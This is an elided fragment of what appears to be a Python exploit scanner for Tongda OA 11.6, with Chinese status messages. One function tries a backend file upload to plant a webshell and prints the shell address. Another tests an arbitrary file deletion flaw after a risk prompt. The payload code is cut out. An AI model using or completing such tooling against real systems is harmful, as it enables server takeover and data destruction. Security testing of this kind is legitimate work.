...
def file_upload(target_url): # 11.6后台上传getshell
    print(GREEN + '[!] 正在尝试后台上传getshell' + END)
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            print(GREEN + '[*] shell地址为:' + url_webshell + '\n' + END)
            time.sleep(2)
        else:
            print(RED + "[-] 不存在该漏洞\n" + END)
    except:
...
def run(host):
    print(CYAN + '[->] 正在测试通达11.6任意文件删除漏洞（仅限11.6）' + END)
    flag = int(input('[!] 该操作存在风险，如确定执行请输入1，不执行输入2：' + '\n'))
    if flag != 1:
        print(RED+ '[-] 正在跳过该漏洞......\n' + END)
        time.sleep(2)
        pass
